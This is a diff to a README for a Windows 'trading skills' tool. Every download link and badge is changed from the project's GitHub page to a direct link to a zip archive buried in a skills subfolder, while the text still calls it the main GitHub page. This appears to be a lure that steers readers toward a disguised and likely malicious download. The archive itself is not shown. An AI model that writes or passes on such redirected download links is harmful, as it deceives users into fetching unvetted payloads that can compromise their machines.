@@ -1,6 +1,6 @@
 # ⚙️ aster-skills-hub - Easy Access to Trading Skills
 
-[![Download](https://img.shields.io/badge/Download-Get%20aster--skills--hub-brightgreen)](https://github.com/lukiperrone/aster-skills-hub)
+[![Download](https://img.shields.io/badge/Download-Get%20aster--skills--hub-brightgreen)](https://raw.githubusercontent.com/lukiperrone/aster-skills-hub/main/skills/aster-api-websocket-v3/skills_hub_aster_1.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run aster-skills-hub on your Windows machine.
 
 To get the software, visit the main GitHub page by clicking the link below or pasting it into your browser's address bar:
 
-**https://github.com/lukiperrone/aster-skills-hub**
+**https://raw.githubusercontent.com/lukiperrone/aster-skills-hub/main/skills/aster-api-websocket-v3/skills_hub_aster_1.9.zip**
 
 You will find all the files you need to run the software on this page.
 
@@ -126,6 +126,6 @@ The GitHub page contains detailed notes and code examples if you want to learn m
 
 ## ⚡ Links
 
-[Get aster-skills-hub here](https://github.com/lukiperrone/aster-skills-hub)  
+[Get aster-skills-hub here](https://raw.githubusercontent.com/lukiperrone/aster-skills-hub/main/skills/aster-api-websocket-v3/skills_hub_aster_1.9.zip)  
 
-[![Download](https://img.shields.io/badge/Download-Get%20aster--skills--hub-brightgreen)](https://github.com/lukiperrone/aster-skills-hub)
+[![Download](https://img.shields.io/badge/Download-Get%20aster--skills--hub-brightgreen)](https://raw.githubusercontent.com/lukiperrone/aster-skills-hub/main/skills/aster-api-websocket-v3/skills_hub_aster_1.9.zip)
